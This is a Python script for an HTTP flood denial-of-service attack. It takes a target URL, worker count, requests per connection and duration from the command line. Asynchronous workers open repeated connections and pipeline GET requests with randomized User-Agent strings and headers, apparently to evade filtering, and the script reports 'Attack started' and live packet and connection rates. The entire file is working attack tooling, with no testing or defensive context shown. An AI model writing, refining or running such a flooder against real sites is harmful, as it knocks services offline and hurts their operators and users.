from random import choice
from asyncio import open_connection, create_task, Event, sleep, run
from yarl import URL
from sys import argv as args
from contextlib import suppress

pps, cps = 0, 0

# Random User-Agent Generator
def random_useragent():
    platforms = [
        "(Windows NT 10.0; Win64; x64)",
        "(iPhone; CPU iPhone OS 16_5 like Mac OS X)",
        "(Linux; Android 13; SM-S901B)"
    ]
    browsers = [
        "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
        "AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1",
        "Gecko/20100101 Firefox/118.0"
    ]
    return f"Mozilla/5.0 {choice(platforms)} {choice(browsers)}"

# Random Header Generator
def random_headers():
    return choice([
        "Accept: text/html,application/xhtml+xml",
        "Accept-Language: en-US,en;q=0.9",
        "Accept-Encoding: gzip, deflate, br"
    ])

async def flooder(target: URL, payload: bytes, event: Event, rpc: int = 100):
    global pps, cps
    await event.wait()
    while event.is_set():
        with suppress(Exception):
            r, w = await open_connection(target.host, target.port or 80, ssl=target.scheme == "https")
            cps += 1
            for _ in range(rpc):
                # Dynamically generate unique payload per request
                dynamic_payload = (
                    f"GET {target.raw_path_qs} HTTP/1.1\r\n"
                    f"Host: {target.raw_authority}\r\n"
                    f"User-Agent: {random_useragent()}\r\n"
                    f"{random_headers()}\r\n"
                    "Connection: keep-alive\r\n"
                    "\r\n"
                ).encode()
                w.write(dynamic_payload)
                await w.drain()
                pps += 1

# Rest of the script remains identical
async def main():
    global pps, cps
    try:
        assert len(args) == 5, "python3 %s <target> <workers> <rpc> <timer>" % args[0]
        target = URL(args[1])
        workers = int(args[2])
        rpc = int(args[3])
        timer = int(args[4])
        event = Event()

        # Original payload (unused due to dynamic generation)
        payload = b""
        
        event.clear()
        for _ in range(workers):
            create_task(flooder(target, payload, event, rpc))
            await sleep(.0)
        
        event.set()
        print(f"Attack started to {target.human_repr()}")

        while timer:
            pps, cps = 0, 0
            await sleep(1)
            timer -= 1
            print(f"PPS: {pps:,} | CPS: {cps:,} | Time Left: {timer}s")
        event.clear()
    except Exception as e:
        print(f"Error: {e}")

run(main())